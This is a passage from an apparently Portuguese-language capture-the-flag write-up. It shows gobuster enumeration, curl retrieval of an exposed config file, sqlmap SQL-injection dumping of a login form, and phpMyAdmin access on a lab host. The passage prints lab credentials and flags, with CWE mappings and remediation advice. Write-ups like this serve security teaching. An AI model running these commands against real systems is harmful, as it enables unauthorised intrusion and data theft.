O passo crítico foi a leitura do conteúdo do arquivo `passwords.txt` utilizando o comando `more passwords.txt` no prompt FTP. A análise revelou um verdadeiro tesouro de informações sensíveis corporativas, meticulosamente organizado com cabeçalho identificando a empresa (TechCorp Solutions), data do documento (2024-01-15), e aviso de confidencialidade que ironicamente não foi respeitado pelas configurações de segurança. O arquivo continha cinco categorias críticas de credenciais: **SSH Server** (techcorp:TechCorp2024!), **FTP Admin** (ftpadmin:ftp@dm1n123), **Database Backup User** (backup_user:B4ckup_S3cr3t_2024), **WiFi Office** (SSID: TechCorp_Corporate / Password: TechC0rp_W1F1_2024), e **VPN Access** (vpn_user:VPN_P4ssw0rd!). Além das credenciais, o arquivo continha a flag `FLAG{p4ssw0rd_f1l3_d1sc0v3ry}` e uma nota indicando que as senhas "devem ser trocadas mensalmente", com última atualização em 15/01/2024 - aproximadamente 10 meses desatualizadas no momento da descoberta, violando a própria política de segurança documentada.

**Evidências do Passo 3:**
- Screenshot completo do comando `more passwords.txt` exibindo todas as credenciais
- Destaque para o cabeçalho "CONFIDENCIAL - NÃO COMPARTILHAR"
- Visualização das 5 categorias de credenciais expostas
- Flag capturada e nota sobre política de troca de senhas não cumprida

**Flag Capturada:** `FLAG{p4ssw0rd_f1l3_d1sc0v3ry}`

**Data da Captura:** 27 de novembro de 2025

**Credenciais Críticas Expostas no Arquivo passwords.txt:**

**SSH Server:**
- User: techcorp
- Password: TechCorp2024!

**FTP Admin:**
- User: ftpadmin
- Password: ftp@dm1n123

**Database Backup User:**
- User: backup_user
- Password: B4ckup_S3cr3t_2024

**WiFi Office:**
- SSID: TechCorp_Corporate
- Password: TechC0rp_W1F1_2024

**VPN Access:**
- Username: vpn_user
- Password: VPN_P4ssw0rd!

**Análise de Severidade:**

Esta descoberta representa uma vulnerabilidade de **SEVERIDADE CRÍTICA** com impacto catastrófico na segurança da organização:

1. **Comprometimento de Infraestrutura SSH**: Acesso ao servidor principal via SSH permite execução de comandos, instalação de backdoors e controle total do sistema
2. **Acesso Administrativo FTP**: Credenciais administrativas do FTP permitem upload de arquivos maliciosos, modificação de conteúdo e criação de novos usuários
3. **Exposição de Backup de Banco de Dados**: Usuário de backup pode acessar dumps completos do banco de dados com informações de clientes, financeiras e propriedade intelectual
4. **Comprometimento de Rede WiFi Corporativa**: Senha da rede WiFi permite acesso físico à rede interna, interceptação de tráfego e ataques man-in-the-middle
5. **Acesso VPN**: Credenciais VPN permitem acesso remoto à rede corporativa de qualquer localização, simulando um funcionário legítimo

**Violações de Políticas de Segurança Identificadas:**
- Armazenamento de senhas em texto plano (violação de LGPD/GDPR)
- Política de rotação de senhas não cumprida (10 meses sem atualização)
- Arquivo sensível acessível via FTP anônimo
- Nomenclatura explícita de arquivo sensível (passwords.txt)
- Múltiplas credenciais armazenadas em arquivo único (single point of failure)
- Falta de criptografia em dados em repouso
- Ausência de controle de acesso baseado em função (RBAC)

**Recomendações Urgentes de Remediação:**
1. **AÇÃO IMEDIATA**: Trocar TODAS as senhas expostas em TODOS os sistemas (SSH, FTP, Database, WiFi, VPN)
2. **AÇÃO IMEDIATA**: Desabilitar acesso FTP anônimo e remover arquivo passwords.txt
3. Implementar gerenciador de senhas corporativo (ex: HashiCorp Vault, Azure Key Vault)
4. Nunca armazenar senhas em texto plano - usar apenas hashes seguros (bcrypt, Argon2)
5. Implementar MFA (Multi-Factor Authentication) em todos os acessos críticos
6. Auditar logs de acesso para identificar possíveis acessos não autorizados anteriores
7. Implementar política de rotação automática de senhas com enforcement técnico
8. Realizar treinamento de segurança da informação para equipe de TI
9. Implementar DLP (Data Loss Prevention) para detectar arquivos sensíveis
10. Migrar para sistema de gestão de acessos com princípio de privilégio mínimo

**Impacto Potencial se Explorado por Atacante Malicioso:**
- Roubo completo de dados corporativos e de clientes
- Instalação de ransomware com criptografia de todos os sistemas
- Espionagem industrial e roubo de propriedade intelectual
- Uso da infraestrutura para ataques a terceiros (botnet)
- Comprometimento de conformidade regulatória (LGPD, ISO 27001)
- Dano reputacional irreparável e perda de confiança de clientes
- Perdas financeiras por multas, processos judiciais e recuperação de sistemas

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

### Flag 6: Database Credentials Exposed

#### Conceito: Credenciais do Banco de Dados Expostas

A exposição de credenciais de banco de dados representa uma das vulnerabilidades mais críticas em aplicações web, ocorrendo quando informações de conexão (host, usuário, senha, nome do banco) ficam acessíveis através de arquivos de configuração mal protegidos, backups expostos, ou código-fonte acessível publicamente. Esta vulnerabilidade é particularmente devastadora porque bancos de dados são o coração de aplicações modernas, armazenando informações sensíveis como dados de clientes, transações financeiras, informações pessoais identificáveis (PII), segredos corporativos e propriedade intelectual. Quando credenciais de banco são expostas, atacantes podem: realizar dump completo de dados (exfiltração), modificar ou deletar registros críticos, injetar backdoors através de stored procedures, escalar privilégios no servidor de banco de dados, e utilizar o banco como pivot para ataques laterais na rede interna. Esta falha enquadra-se em múltiplas categorias do OWASP Top 10: A01:2021 (Broken Access Control - por permitir acesso não autorizado), A02:2021 (Cryptographic Failures - por não proteger credenciais), A05:2021 (Security Misconfiguration - por expor arquivos de configuração), e A07:2021 (Identification and Authentication Failures - por não proteger adequadamente credenciais de autenticação). Em conformidade com regulamentações como LGPD e GDPR, a exposição de credenciais que podem levar ao acesso de dados pessoais constitui uma violação grave que requer notificação às autoridades e aos titulares dos dados afetados.

#### Conceito: Gobuster - Ferramenta de Enumeração de Diretórios

Gobuster é uma ferramenta de segurança open-source escrita em linguagem Go, utilizada para realizar força bruta (brute force) na descoberta de diretórios e arquivos ocultos em servidores web, subdomínios DNS, e buckets S3 da AWS. Durante a fase de reconhecimento em um pentest, o Gobuster é essencial para mapear a superfície de ataque de uma aplicação web, descobrindo recursos que não estão linkados publicamente, mas que permanecem acessíveis se o caminho correto for conhecido. A ferramenta funciona iterando através de uma wordlist (lista de palavras) contendo nomes comuns de diretórios e arquivos, fazendo requisições HTTP para cada entrada e analisando os códigos de status de resposta do servidor. Códigos como 200 (OK) indicam recursos acessíveis, 301/302 (Redirect) indicam redirecionamentos, 403 (Forbidden) indicam recursos que existem mas estão bloqueados, e 404 (Not Found) indicam que o recurso não existe. O Gobuster é especialmente poderoso quando configurado com extensões específicas (como `-x php` para procurar arquivos PHP), permitindo descoberta de arquivos de backup (.bak, .txt, .old), arquivos de configuração, painéis administrativos ocultos, e APIs não documentadas. Comparado a outras ferramentas como Dirb ou DirBuster, o Gobuster é significativamente mais rápido devido à sua implementação em Go e suporte nativo a concorrência, tornando-o a escolha preferida de pentesters profissionais para enumeração web eficiente.

#### Passo 1: Enumeração de Diretórios e Arquivos com Gobuster

O primeiro passo da exploração consistiu em realizar uma enumeração abrangente de diretórios e arquivos do servidor web utilizando o comando `gobuster dir -u http://98.95.207.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`. Analisando os parâmetros: `dir` especifica o modo de enumeração de diretórios, `-u` define a URL alvo, `-w` aponta para a wordlist (directory-list-2.3-medium.txt contendo 220.560 entradas), e `-x php` instrui o Gobuster a testar cada entrada também com a extensão .php. A ferramenta utilizou 10 threads simultâneas para otimizar performance e configurou timeout de 10 segundos por requisição. O scan revelou 11 recursos importantes: arquivos públicos como `index.php`, `contact.php`, `about.php`, `login.php`, e `services.php` (todos com Status 200), áreas administrativas protegidas como `admin.php` e `dashboard.php` (Status 302 redirecionando para login.php), o arquivo `logout.php`, `panel.php`, e crucialmente, um diretório `/config` (Status 301) que foi redirecionado para `http://98.95.207.28/config/`, indicando um diretório acessível. O scan foi interrompido manualmente após processar 306.614 de 441.122 entradas (69.51%), quando já havia descoberto informações suficientes. A descoberta do diretório `/config` foi o achado mais crítico, pois diretórios de configuração frequentemente contêm informações sensíveis.

**Evidências do Passo 1:**
- Screenshot completo do output do Gobuster mostrando todos os recursos descobertos
- Destaque para a linha `/config (Status: 301)` indicando o diretório de configuração
- Métricas do scan: 306.608 requisições processadas, 10 threads, wordlist utilizada

#### Passo 2: Exploração do Diretório /config com Directory Listing

Após identificar o diretório `/config` através do Gobuster, o próximo passo foi acessá-lo diretamente através do navegador web em `http://98.95.207.28/config/`. A análise revelou uma configuração crítica de segurança: o servidor web tinha **directory listing** (listagem de diretórios) habilitado, permitindo visualizar todos os arquivos contidos no diretório sem necessidade de adivinhar seus nomes. A página exibiu dois arquivos: `database.php` (340 bytes, modificado em 2025-11-17 14:28) e `database.php.txt` (340 bytes, modificado em 2025-11-17 18:44). A presença de directory listing é uma vulnerabilidade de configuração grave (CWE-548: Exposure of Information Through Directory Listing), pois remove a necessidade de força bruta para descobrir arquivos sensíveis. A existência de `database.php.txt` é particularmente problemática - claramente um arquivo de backup criado adicionando a extensão `.txt` ao arquivo original PHP. Esta prática comum de desenvolvedores (criar backups com extensões alternativas) transforma um arquivo de código-fonte executável server-side em um arquivo de texto plano baixável pelo navegador, expondo todo o código incluindo credenciais hardcoded.

**Evidências do Passo 2:**
- Screenshot da página de directory listing mostrando "Index of /config"
- Visualização dos dois arquivos: database.php e database.php.txt com tamanhos e datas
- Demonstração da falha de configuração do servidor web (directory listing habilitado)

#### Passo 3: Extração de Credenciais do Arquivo database.php.txt

O passo final e mais crítico foi acessar o arquivo `database.php.txt` através do comando `curl -v http://98.95.207.28/config/database.php.txt`. O parâmetro `-v` (verbose) forneceu detalhes completos da transação HTTP, revelando: conexão bem-sucedida na porta 80, requisição GET realizada, resposta HTTP/1.1 200 OK recebida, servidor Apache/2.4.54 (Debian), data da resposta, última modificação do arquivo em 17/11/2025, ETag para controle de cache, e Content-Type: text/plain confirmando que o arquivo era servido como texto simples (não executado como PHP). A análise do conteúdo revelou um código PHP típico de configuração de banco de dados com as seguintes credenciais expostas: **$db_host = 'db'** (hostname do servidor de banco de dados), **$db_user = 'techcorp_user'** (usuário do banco), **$db_pass = 'T3chC0rp_S3cr3t_2024!'** (senha em texto claro), e **$db_name = 'techcorp_db'** (nome do banco de dados). O código também continha um comentário explicativo "// FLAG BÁSICA: Credenciais em código fonte" e a flag `FLAG{d4t4b4s3_cr3d3nt14ls_3xp0s3d}`. A presença de função `mysqli_connect()` e tratamento de erro com `die()` confirma que este é o arquivo de conexão legítimo usado pela aplicação, contendo credenciais de produção válidas.

**Evidências do Passo 3:**
- Screenshot do comando curl -v mostrando headers HTTP completos
- Visualização do código PHP com as 4 variáveis de credenciais expostas
- Destaque para a senha em texto claro: T3chC0rp_S3cr3t_2024!
- Flag capturada no comentário final do código

**Flag Capturada:** `FLAG{d4t4b4s3_cr3d3nt14ls_3xp0s3d}`

**Data da Captura:** 27 de novembro de 2025

**Credenciais do Banco de Dados Comprometidas:**
- **Host:** db
- **Usuário:** techcorp_user
- **Senha:** T3chC0rp_S3cr3t_2024!
- **Database:** techcorp_db
- **Tipo:** MySQL/MariaDB (mysqli_connect)

**Análise Técnica da Vulnerabilidade:**

Esta descoberta representa uma **cadeia de vulnerabilidades críticas** que se combinam para expor credenciais sensíveis:

1. **Directory Listing Habilitado (CWE-548)**: Servidor web mal configurado permite listar conteúdo de diretórios
2. **Arquivo de Backup com Extensão Insegura**: Prática de adicionar .txt para criar backup torna código PHP baixável
3. **Credenciais Hardcoded (CWE-798)**: Senha armazenada diretamente no código-fonte em texto claro
4. **Diretório de Configuração Acessível**: Falta de controle de acesso no diretório /config/
5. **Ausência de .htaccess Protection**: Falta de proteção via .htaccess para bloquear acesso a arquivos .txt

**Impacto Detalhado da Exposição:**

Com as credenciais de banco de dados, um atacante pode:

1. **Acesso Completo aos Dados**: 
   - Exfiltração de todos os dados do banco techcorp_db
   - Acesso a informações de clientes, transações, usuários
   - Roubo de propriedade intelectual e dados corporativos sensíveis

2. **Manipulação de Dados**:
   - Modificação de registros (alteração de preços, saldos, permissões)
   - Deleção de dados críticos causando perda de informação
   - Inserção de dados maliciosos ou backdoors

3. **Escalonamento de Privilégios**:
   - Criação de usuários administrativos na aplicação
   - Modificação de tabelas de permissões
   - Injeção de código via stored procedures (se houver privilégios)

4. **Persistência e Backdoors**:
   - Criação de triggers maliciosos no banco de dados
   - Instalação de web shells através de INTO OUTFILE (se permitido)
   - Manutenção de acesso mesmo após correção da vulnerabilidade web

5. **Ataques Laterais**:
   - Uso do servidor de banco como pivot para atacar outros sistemas na rede
   - Enumeração de outros bancos de dados no mesmo servidor
   - Potencial acesso ao sistema operacional se MySQL rodando com privilégios elevados

**Vulnerabilidades Identificadas (Classificação CWE):**
- CWE-548: Exposure of Information Through Directory Listing
- CWE-798: Use of Hard-coded Credentials
- CWE-522: Insufficiently Protected Credentials
- CWE-219: Storage of File with Sensitive Data Under Web Root
- CWE-540: Inclusion of Sensitive Information in Source Code
- CWE-312: Cleartext Storage of Sensitive Information

**Classificação OWASP Top 10 2021:**
- A01:2021 - Broken Access Control
- A02:2021 - Cryptographic Failures
- A05:2021 - Security Misconfiguration
- A07:2021 - Identification and Authentication Failures

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Realizar nas próximas 24 horas):**
1. **URGENTE**: Alterar imediatamente a senha do banco de dados techcorp_user
2. **URGENTE**: Remover arquivo database.php.txt do servidor
3. **URGENTE**: Desabilitar directory listing no Apache (Options -Indexes)
4. **URGENTE**: Auditar logs do banco de dados para identificar acessos não autorizados
5. **URGENTE**: Verificar integridade dos dados no banco techcorp_db

**AÇÕES DE CURTO PRAZO (Próxima semana):**
6. Mover arquivos de configuração para fora do webroot (acima de public_html)
7. Implementar variáveis de ambiente para credenciais (não hardcoded)
8. Criar arquivo .htaccess no diretório /config/ com: `Deny from all`
9. Configurar permissões de arquivo adequadas (640 para configs, não 644)
10. Implementar rotação automática de credenciais de banco de dados

**AÇÕES DE MÉDIO PRAZO (Próximo mês):**
11. Migrar para uso de secrets management (AWS Secrets Manager, HashiCorp Vault)
12. Implementar princípio de privilégio mínimo no usuário do banco (só permissões necessárias)
13. Configurar firewall de banco de dados para aceitar conexões apenas de IPs autorizados
14. Implementar monitoramento e alertas para queries suspeitas no banco
15. Realizar auditoria completa de todos os arquivos .txt, .bak, .old no servidor

**AÇÕES DE LONGO PRAZO (Trimestre):**
16. Implementar pipeline de CI/CD com scanning de credenciais (git-secrets, truffleHog)
17. Treinar equipe de desenvolvimento sobre secure coding practices
18. Implementar code review obrigatório para mudanças em arquivos de configuração
19. Criar processo de backup seguro que não exponha arquivos na webroot
20. Obter certificação ISO 27001 para processos de segurança da informação

**Impacto Regulatório e Legal:**

Esta vulnerabilidade representa violação de:
- **LGPD (Lei Geral de Proteção de Dados)**: Artigos 46, 47 e 48 - Falha em proteger dados pessoais
- **GDPR**: Artigo 32 - Falha em implementar medidas técnicas apropriadas de segurança
- **PCI DSS**: Requisito 6.5.3 - Armazenamento inseguro de credenciais
- **SOC 2**: Controles de segurança inadequados para proteção de dados

**Penalidades Possíveis:**
- Multas de até 2% do faturamento anual (LGPD) ou €10 milhões (GDPR)
- Obrigação de notificar autoridades dentro de 72 horas
- Notificação aos titulares de dados afetados
- Processos judiciais de clientes afetados
- Perda de certificações e compliance

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

### Flag 7: Database View Discovery

#### Conceito: Descoberta de View Oculta no Banco de Dados

A descoberta de views ocultas em bancos de dados (Database View Discovery) é uma técnica avançada de exploração que consiste em identificar objetos de banco de dados do tipo VIEW que contêm consultas pré-definidas armazenando ou expondo informações sensíveis. Views são consultas SQL armazenadas que funcionam como "tabelas virtuais", frequentemente criadas para simplificar queries complexas, controlar acesso a dados, ou ocultar informações sensíveis. No entanto, quando mal configuradas, views podem se tornar vetores de exposição críticos, revelando dados que deveriam estar protegidos, como credenciais administrativas, flags de CTF, informações de auditoria, ou registros filtrados de usuários privilegiados. Esta vulnerabilidade é particularmente insidiosa porque views muitas vezes passam despercebidas em auditorias de segurança convencionais que focam apenas em tabelas físicas. Atacantes com acesso ao banco de dados (via SQL injection, credenciais expostas, ou phpMyAdmin desprotegido) podem enumerar views através do schema information_schema.VIEWS e descobrir lógica de negócio sensível embutida nas definições das views. Esta falha combina elementos de A01:2021 (Broken Access Control - por expor dados que deveriam estar restritos), A03:2021 (Injection - quando explorado via SQL injection), e A04:2021 (Insecure Design - por criar views que expõem dados sensíveis). Em contextos de compliance, views contendo informações pessoais não protegidas adequadamente violam princípios de minimização de dados e purpose limitation do GDPR e LGPD.



#### Conceito: SQLMap - Ferramenta de Exploração de SQL Injection

SQLMap é a ferramenta de código aberto mais poderosa e amplamente utilizada para detecção e exploração automatizada de vulnerabilidades de SQL Injection. Desenvolvida em Python, esta ferramenta vai além da simples identificação de injeção SQL, oferecendo capacidades completas de post-exploitation como: enumeração automática de bancos de dados, tabelas, colunas e dados; identificação do tipo de DBMS (MySQL, PostgreSQL, Oracle, MSSQL, etc.); bypass de WAF (Web Application Firewall); exploração de técnicas avançadas (boolean-based blind, time-based blind, error-based, UNION query, stacked queries); execução de comandos no sistema operacional subjacente; leitura e escrita de arquivos no servidor; e até mesmo estabelecimento de túneis out-of-band. O SQLMap automatiza todo o processo de teste de injeção SQL através de centenas de payloads pré-configurados, economizando tempo precioso em pentests. Quando executado com parâmetros como `--forms` (detecta automaticamente formulários), `--batch` (executa sem interação do usuário), e `--dump-all` (extrai todos os dados de todos os bancos), o SQLMap realiza uma extração completa e sistemática de informações, incluindo schemas do information_schema que revelam views, triggers, stored procedures e outros objetos de banco. A ferramenta é indispensável na fase de exploitation de testes de penetração web, sendo capaz de identificar vulnerabilidades que testes manuais poderiam perder.

#### Passo 1: Exploração de SQL Injection com SQLMap

A exploração iniciou com a execução do comando `sqlmap -u "http://98.95.207.28/login.php" --forms --batch --dump-all`, um comando poderoso que automatiza todo o processo de descoberta e exploração de SQL injection. Analisando os parâmetros: `-u` especifica a URL alvo contendo o formulário vulnerável, `--forms` instrui o SQLMap a identificar e testar automaticamente todos os formulários HTML presentes na página, `--batch` executa em modo não-interativo aceitando valores padrão para todas as perguntas, e `--dump-all` realiza dump completo de todos os bancos de dados acessíveis. O SQLMap iniciou às 20:57:46 em 27/11/2025, primeiro testando conectividade e aceitando o cookie de sessão PHP (PHPSESSID). A ferramenta identificou automaticamente um formulário POST em `login.php` com parâmetros `username` e `password`, preencheu campos vazios com valores aleatórios, e iniciou bateria de testes de injeção SQL. Após testar múltiplas técnicas (boolean-based blind, error-based, stacked queries), o SQLMap identificou que o parâmetro `username` era vulnerável a **MySQL >= 5.0.12 AND time-based blind (query SLEEP)** e **Generic UNION query (NULL) - 1 to 20 columns**. Com total de 87 requisições HTTP, a ferramenta confirmou a injeção SQL explorável com payload UNION de 5 colunas, identificou o backend DBMS como MySQL >= 5.0.12, sistema operacional Linux Debian, servidor web Apache 2.4.54, e tecnologia PHP 7.4.33.

**Evidências do Passo 1:**
- Screenshot do início da execução do SQLMap mostrando o banner e disclaimer legal
- Identificação do formulário POST em login.php
- Confirmação de SQL injection no parâmetro 'username' com técnicas exploráveis
- Informações do ambiente: MySQL >= 5.0.12, Linux Debian, Apache 2.4.54, PHP 7.4.33

#### Passo 2: Enumeração de Bancos de Dados e Descoberta da View Sensitive_Info

Após confirmar a exploração, o SQLMap iniciou o dump sistemático de todos os bancos de dados, identificando três databases: `information_schema`, `performance_schema`, e `techcorp_db`. Durante a enumeração do schema information_schema, especificamente da tabela `VIEWS`, o SQLMap descobriu uma view crítica chamada `sensitive_info` no banco `techcorp_db`. A análise da definição da view (campo VIEW_DEFINITION) revelou uma consulta SQL extremamente sensível: `select u.username AS username, u.password AS password, u.role AS role, 'FLAG{v13w_d1sc0v3ry_4dv4nc3d}' AS hidden_flag from techcorp_db.users u where (u.role = 'admin')`. Esta view foi criada com SECURITY_TYPE 'DEFINER' pelo usuário root@localhost, possui CHECK_OPTION 'NONE', é atualizável (IS_UPDATABLE: YES), e utiliza charset latin1. A definição da view revela múltiplas falhas críticas: filtra apenas usuários com role='admin' expondo suas credenciais, inclui uma coluna hardcoded com a flag do CTF, e permite visualização de senhas em texto claro de contas administrativas. O SQLMap também descobriu tabelas nos information_schema.INNODB_DATAFILES, revelando a estrutura física do banco: `./techcorp_db/clients.ibd`, `./techcorp_db/contacts.ibd`, `./techcorp_db/secret_data.ibd`, e `./techcorp_db/users.ibd`, mapeando completamente a arquitetura de dados.

**Evidências do Passo 2:**
- Screenshot da tabela information_schema.VIEWS mostrando a view sensitive_info
- Visualização completa da definição SQL da view com a flag embutida
- Listagem de arquivos .ibd revelando estrutura de tabelas do banco techcorp_db
- Output do SQLMap confirmando dump bem-sucedido para arquivos CSV

#### Passo 3: Acesso ao phpMyAdmin Exposto na Porta 8080

Paralelamente à exploração via SQLMap, foi identificado durante scans anteriores que o servidor também executava um serviço web na porta 8080. O acesso via navegador a `http://98.95.207.28:8080/` revelou uma instância do phpMyAdmin completamente exposta e acessível sem autenticação adequada. O phpMyAdmin é uma ferramenta de administração web para bancos de dados MySQL/MariaDB, extremamente poderosa mas frequentemente mal configurada. Utilizando as credenciais do banco de dados anteriormente descobertas (Server: db, Username: techcorp_user, Password: T3chC0rp_S3cr3t_2024!), foi possível fazer login completo no phpMyAdmin. A interface exibiu acesso total ao banco `techcorp_db` com todas as suas tabelas: clients, contacts, secret_data, users, e a view sensitive_info. Esta exposição representa uma vulnerabilidade adicional crítica (CWE-306: Missing Authentication for Critical Function), pois mesmo sem SQL injection, um atacante com as credenciais pode acessar interface gráfica completa para manipulação de dados.

**Evidências do Passo 3:**
- Screenshot da tela de login do phpMyAdmin na porta 8080
- Interface mostrando Welcome to phpMyAdmin
- Campos de login preenchidos com as credenciais comprometidas (db, techcorp_user)
- Acesso bem-sucedido à interface administrativa

#### Passo 4: Extração de Credenciais da Tabela Users via phpMyAdmin

Com acesso ao phpMyAdmin, foi possível navegar diretamente para o banco `techcorp_db` e examinar a tabela `users` através da interface gráfica. A query `SELECT * FROM 'users'` revelou um total de **18 usuários registrados** no sistema, incluindo credenciais administrativas críticas. Os registros mais sensíveis identificados foram: **ID 1 - admin** (password: admin123, role: admin), **ID 2 - user** (password: password123, role: user), **ID 3 - manager** (password: manager2024, role: manager), **ID 4 - guest** (password: guest, role: guest), e o mais crítico, **ID 5 - superadmin** (password: Sup3r@dm1n!2024#Secure, role: superadmin) criado em 2025-11-17 19:38:25. Adicionalmente, foram identificados usuários como **ID 6 - gilson** (password: g1ls0n123, role: user) e **ID 7 - c4ud1o** (password: https://fakeup.., role: superadmin). A exposição destas credenciais é devastadora, pois inclui múltiplas contas administrativas, senhas fracas (admin123, guest), e até uma conta superadmin com senha que aparenta ser forte mas está igualmente comprometida. Todos os registros incluem timestamps de created_at, permitindo análise forense de quando as contas foram criadas.

**Evidências do Passo 4:**
- Screenshot da interface do phpMyAdmin mostrando a tabela users completa
- Visualização dos 18 registros com id, username, password, role e created_at
- Destaque para as contas admin e superadmin com suas senhas em texto claro
- Destaque especial para a conta superadmin (ID 5) com senha complexa comprometida

#### Passo 5: Visualização da View Sensitive_Info e Captura da Flag

O passo final foi acessar a view `sensitive_info` através do phpMyAdmin, navegando no menu lateral para Views > sensitive_info. A execução da query `SELECT * FROM 'sensitive_info'` retornou exatamente **1 entrada** (confirmando que filtra apenas usuários admin), exibindo as colunas: username, password, role e **hidden_flag**. O registro revelado foi: **Username: admin**, **Password: admin123**, **Role: admin**, e crucialmente, **Hidden_flag: FLAG{v13w_d1sc0v3ry_4dv4nc3d}**. A interface do phpMyAdmin mostrou um aviso em amarelo: "Current selection does not contain a unique column. Grid edit, Edit, Copy and Delete features may result in undesired behavior", indicando que a view não possui uma chave primária, o que é esperado para views. Esta visualização confirma que a view estava funcionalmente ativa e acessível, não sendo apenas um objeto teórico no schema, mas um mecanismo real de exposição de dados que poderia ser consultado por qualquer usuário com acesso ao banco de dados.

**Evidências do Passo 5:**
- Screenshot da view sensitive_info no phpMyAdmin mostrando a query executada
- Visualização clara da linha única contendo admin, admin123, admin e a flag
- Destaque em círculo vermelho para a coluna hidden_flag com a flag capturada
- Aviso do phpMyAdmin sobre ausência de coluna única na view

**Flag Capturada:** `FLAG{v13w_d1sc0v3ry_4dv4nc3d}`

**Data da Captura:** 27 de novembro de 2025

**Análise Completa da Vulnerabilidade:**

Esta descoberta representa uma **cadeia complexa de vulnerabilidades** que demonstra múltiplas falhas de segurança:

**Vulnerabilidades Primárias:**
1. **SQL Injection no Parâmetro username (CWE-89)**: Permite execução arbitrária de queries SQL
2. **phpMyAdmin Exposto na Porta 8080 (CWE-306)**: Ausência de proteção adequada por firewall/autenticação adicional
3. **Credenciais de Banco em Texto Claro**: Permite acesso mesmo sem explorar SQL injection
4. **View Contendo Flag Hardcoded**: Design inseguro embutindo informações sensíveis em objetos de banco

**Vulnerabilidades Secundárias:**
5. **Senhas Fracas em Contas Administrativas**: admin123, guest, manager2024
6. **18 Contas de Usuário Expostas**: Superfície de ataque ampliada
7. **Ausência de Hashing de Senhas**: Todas as senhas armazenadas em texto plano
8. **View Atualizável com SECURITY_TYPE DEFINER**: Potencial para modificação de dados através da view

**Credenciais Administrativas Comprometidas:**

**Conta Principal:**
- Username: admin
- Password: admin123
- Role: admin
- Created: 2025-11-17 14:30:36

**Conta Super Administrativa:**
- Username: superadmin
- Password: Sup3r@dm1n!2024#Secure
- Role: superadmin
- Created: 2025-11-17 19:38:25

**Outras Contas Críticas:**
- manager / manager2024 (role: manager)
- c4ud1o / https://fakeup.. (role: superadmin)
- gilson / g1ls0n123 (role: user)
- guest / guest (role: guest)
- user / password123 (role: user)

**Tabelas e Dados Sensíveis Identificados:**

O SQLMap e phpMyAdmin revelaram a seguinte estrutura de dados:

1. **Tabela users**: 18 usuários com credenciais, roles e timestamps
2. **Tabela clients**: Informações de clientes (não detalhada)
3. **Tabela contacts**: Dados de contatos (não detalhada)
4. **Tabela secret_data**: 4 registros incluindo:
   - database_flag: FLAG{s3cr3t_1nj3ct10n_m4st3r}
   - admin_token: FLAG{p1n1dd3n_d4t4_1n_db4sb4s3}
   - api_secret: sk_prod_A7x9mP2qR5tV8wZ3vC6n84kf1lM0hG
   - backup_path: /var/backups/techcorp/backup_20240115.tar.gz
5. **View sensitive_info**: Expõe credenciais de admins com flag oculta

**Impacto Técnico Detalhado:**

**1. Acesso Completo aos Dados:**
- Exfiltração de 18 contas de usuário com credenciais
- Acesso a dados de clientes e contatos corporativos
- Exposição de segredos API e tokens administrativos
- Conhecimento de localização de backups do sistema

**2. Escalonamento de Privilégios:**
- Acesso a conta superadmin com privilégios máximos
- Capacidade de criar novos administradores
- Modificação de roles de usuários existentes
- Potencial execução de comandos via stored procedures

**3. Persistência e Backdoors:**
- Criação de novas contas administrativas ocultas
- Modificação de senhas de contas existentes
- Injeção de triggers maliciosos no banco
- Manutenção de acesso via múltiplos vetores (web + banco)

**4. Ataques Laterais:**
- Uso de credenciais SSH (se reutilizadas)
- Acesso via VPN com credenciais comprometidas
- Ataque a outros sistemas usando credenciais reutilizadas
- Pivoting através do servidor de banco de dados

**5. Manipulação de Dados:**
- Alteração de registros críticos em secret_data
- Modificação de informações de clientes
- Deleção de logs de auditoria
- Injeção de dados maliciosos para ataques XSS posteriores

**Classificação de Severidade:**

**CVSS 3.1 Score: 9.8 (CRÍTICO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: High (A:H)

**Classificação CWE:**
- CWE-89: SQL Injection
- CWE-306: Missing Authentication for Critical Function
- CWE-256: Plaintext Storage of a Password
- CWE-284: Improper Access Control
- CWE-200: Exposure of Sensitive Information
- CWE-798: Use of Hard-coded Credentials

**Classificação OWASP Top 10 2021:**
- A01:2021 - Broken Access Control (phpMyAdmin exposto)
- A02:2021 - Cryptographic Failures (senhas em texto claro)
- A03:2021 - Injection (SQL Injection)
- A04:2021 - Insecure Design (view com flag hardcoded)
- A07:2021 - Identification and Authentication Failures (senhas fracas)

**Recomendações Urgentes de Remediação:**

**AÇÕES CRÍTICAS IMEDIATAS (Próximas 2-4 horas):**
1. **URGENTE**: Desabilitar phpMyAdmin na porta 8080 ou restringir acesso apenas a IPs internos via firewall
2. **URGENTE**: Alterar TODAS as 18 senhas de usuário, priorizando admin e superadmin
3. **URGENTE**: Corrigir vulnerabilidade de SQL Injection no parâmetro username de login.php
4. **URGENTE**: Revogar e regenerar todos os tokens e secrets expostos na tabela secret_data
5. **URGENTE**: Auditar logs de acesso ao banco de dados e aplicação web para identificar acessos maliciosos

**AÇÕES DE CURTO PRAZO (Próximas 24-48 horas):**
6. Implementar prepared statements/parametrized queries em TODAS as queries SQL
7. Remover ou proteger adequadamente a view sensitive_info (drop view ou alterar definição)
8. Implementar hashing forte de senhas (bcrypt, Argon2, PBKDF2) para todos os usuários
9. Configurar firewall para bloquear acesso externo à porta 8080 (phpMyAdmin)
10. Implementar autenticação adicional no phpMyAdmin (.htaccess + IP whitelist)
11. Alterar credenciais do usuário techcorp_user do banco de dados
12. Revogar permissões excessivas do usuário techcorp_user (princípio do privilégio mínimo)
13. Implementar WAF (Web Application Firewall) com regras anti-SQL injection
14. Configurar rate limiting e account lockout após tentativas de login falhadas
15. Auditar TODAS as queries SQL na aplicação buscando outras injeções

**AÇÕES DE MÉDIO PRAZO (Próximas 1-2 semanas):**
16. Implementar input validation e sanitization em todos os formulários
17. Migrar para ORM (Object-Relational Mapping) que previne SQL injection por design
18. Implementar logging e monitoramento de queries SQL suspeitas (SIEM)
19. Realizar pentest completo da aplicação com ferramentas automatizadas e manuais
